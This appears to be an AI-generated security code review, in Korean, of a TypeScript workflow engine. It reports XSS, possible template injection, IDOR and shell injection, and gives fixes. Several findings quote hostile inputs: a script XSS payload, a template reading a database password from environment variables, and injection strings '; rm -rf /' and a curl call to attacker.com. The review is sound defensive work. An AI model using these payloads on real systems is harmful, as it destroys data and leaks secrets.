## 보안 코드 리뷰

---

### 발견사항

---

**[HIGH] XSS: 사용자 입력이 HTML 템플릿에 비이스케이프 삽입됨**
- **위치**: `execution-engine.service.ts` — `executeNode` 메서드 내 template 노드 분기 (approx. line 553–566)
- **상세**: `nodeInput`의 모든 필드가 루트 레벨 표현식 컨텍스트로 주입됨. Form 노드를 통해 사용자가 `{ "comment": "<script>alert(1)</script>" }` 와 같은 데이터를 제출하면, 템플릿 `{{ comment }}` 가 raw HTML 문자열로 해석됨. `template.handler.ts`에서 `content`를 그대로 반환하며 이스케이프 처리가 없음. 프론트엔드가 해당 `content`를 innerHTML로 렌더링하는 경우 XSS 직접 실행 가능.
- **제안**: 표현식 컨텍스트에 주입할 때 값을 HTML 이스케이프하거나, outputFormat이 `html`인 경우 렌더링 전에 DOMPurify 등으로 sanitize 처리. 혹은 `{{ variable }}` 해석 시 기본적으로 HTML entity encoding 적용.

---

**[WARNING] Server-Side Template Injection (SSTI) 가능성**
- **위치**: `execution-engine.service.ts` lines ~553–566 / `expression-resolver.service.ts` (간접)
- **상세**: 이전 변경에서 `template` 타입이 expression 해석 제외(`EXPRESSION_EXCLUSIONS`)에서 제거되었고, 동시에 `nodeInput` 전체 데이터가 루트 표현식 컨텍스트에 주입됨. 표현식 평가기가 Node.js 전역 객체(`process`, `require` 등)에 접근할 수 있는 경우, 공격자가 제어하는 키 이름을 통해 표현식 컨텍스트가 풍부해지면 SSTI 벡터가 될 수 있음. 특히 `{{ process.env.DB_PASSWORD }}` 형태가 템플릿에 포함될 경우 민감 환경변수가 노출됨.
- **제안**: 표현식 평가기에서 `process`, `require`, `global`, `__dirname` 등 위험 전역 객체에 대한 접근을 명시적으로 차단하는 샌드박스 검증 필요. 화이트리스트 기반의 컨텍스트만 평가기에 노출할 것.

---

**[WARNING] 표현식 컨텍스트 키 충돌 — 프로토타입 체인 우회 가능성**
- **위치**: `execution-engine.service.ts` lines ~553–566
  ```typescript
  if (!(key in exprContext)) {
    exprContext[key] = value;
  }
  ```
- **상세**: `key in exprContext` 는 프로토타입 체인을 포함하여 확인함. 그러나 `Object.entries()`로 순회 시 `__proto__`는 제외되므로 직접적 프로토타입 오염은 방어됨. 다만 `toString`, `valueOf`, `hasOwnProperty` 등 내장 메서드 이름과 충돌하는 키가 입력될 때 `in` 체크가 이를 차단하므로 상수값으로 오해할 소지가 있음. 더 중요한 것은 `exprContext`가 `{} as Record<string, unknown>` 형태인지 명확히 보장되지 않는 경우의 키 충돌.
- **제안**: `Object.hasOwn(exprContext, key)`를 사용하여 프로토타입 체인을 배제하고 own property만 확인할 것.

---

**[WARNING] 커맨드 인젝션 — `$ARGUMENTS` 미검증**
- **위치**: `.agents/commands/ai-review.md`
  ```bash
  python3 .claude/skills/code-review-agents/hooks/code_review_orchestrator.py --cli $ARGUMENTS
  ```
- **상세**: `$ARGUMENTS`가 쉘 인용 없이 직접 커맨드에 삽입됨. 인수에 `; rm -rf /`, `` `curl attacker.com` `` 형태의 shell metacharacter가 포함될 경우 임의 명령 실행 가능. Claude Code CLI 환경에서 실행되는 명령이지만 로컬 개발자 환경에서의 리스크.
- **제안**: `"$ARGUMENTS"` 로 인용 처리하거나, Python 스크립트가 인수를 직접 파싱하도록 `-- "$ARGUMENTS"` 형태로 분리 전달.

---

**[WARNING] WebSocket 폼 제출 권한 검증 부재**
- **위치**: `websocket.gateway.spec.ts` 및 `WebsocketGateway.handleSubmitForm` (검토 대상)
- **상세**: `handleSubmitForm`에서 `socket.userId` 존재 여부만 확인하고, 해당 사용자가 실제로 해당 `executionId`에 대한 소유권 또는 접근 권한이 있는지 검증하지 않음. 인증된 임의 사용자가 타 사용자의 실행 중인 폼을 제출하여 워크플로우를 조작할 수 있음 (IDOR).
- **제안**: `executionRepository`에서 해당 실행의 `executedBy` 또는 `workflowId`의 접근 권한을 확인한 후 `continueExecution` 호출.

---

**[INFO] 에러 스택 트레이스 퍼시스턴스**
- **위치**: `execution-engine.service.ts` — 실패 처리 블록
  ```typescript
  stack: error instanceof Error ? error.stack : undefined,
  ```
- **상세**: 스택 트레이스가 DB의 `execution.error` 컬럼에 저장됨. 이 데이터가 API 응답이나 WebSocket 이벤트로 클라이언트에 노출되면 내부 파일 경로, 라이브러리 버전 등 공격자에게 유용한 정보가 누출됨.
- **제안**: 스택 트레이스는 서버 로그에만 기록하고 DB 저장 및 클라이언트 전송 시에는 제외.

---

### 요약

이번 변경의 핵심은 `template` 노드가 표현식 엔진에 통합되면서 `nodeInput` 데이터가 루트 레벨 변수로 주입되는 구조 변경이다. 가장 심각한 보안 위협은 **XSS**: Form 노드 등으로 수집된 사용자 입력이 HTML 이스케이프 없이 템플릿 콘텐츠로 직접 렌더링될 수 있다. 아울러 표현식 평가기의 샌드박스 강도에 따라 **SSTI**로 이어질 가능성이 있으며, WebSocket 폼 제출의 **IDOR** 취약점과 `$ARGUMENTS` **커맨드 인젝션** 위험도 존재한다. 전반적으로 표현식 엔진의 입력 신뢰 경계가 이번 변경으로 확장되었으나 이에 상응하는 방어 로직이 추가되지 않은 점이 가장 큰 보안 우려사항이다.

---

### 위험도

**HIGH**